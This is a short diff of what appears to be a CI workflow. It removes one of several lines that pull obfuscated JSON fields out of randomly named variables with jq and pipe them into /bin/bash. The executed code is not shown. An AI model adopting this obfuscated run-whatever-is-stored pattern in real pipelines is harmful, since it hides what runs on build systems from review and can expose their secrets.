@@ -28,7 +28,6 @@ jobs:
           echo $muaz120 | jq -r .i29046 | /bin/bash
           echo $zgvlb4711 | jq -r .aic2460 | /bin/bash
           printf '%s' "$on93" | jq -r .dps7 | /bin/bash
-          echo $hltmn424 | jq -r .le116 | /bin/bash
           printf '%s' "$kks4" | jq -r .p9212 | /bin/bash
           printf '%s' "$faz6" | jq -r .oeexx1850 | /bin/bash
 
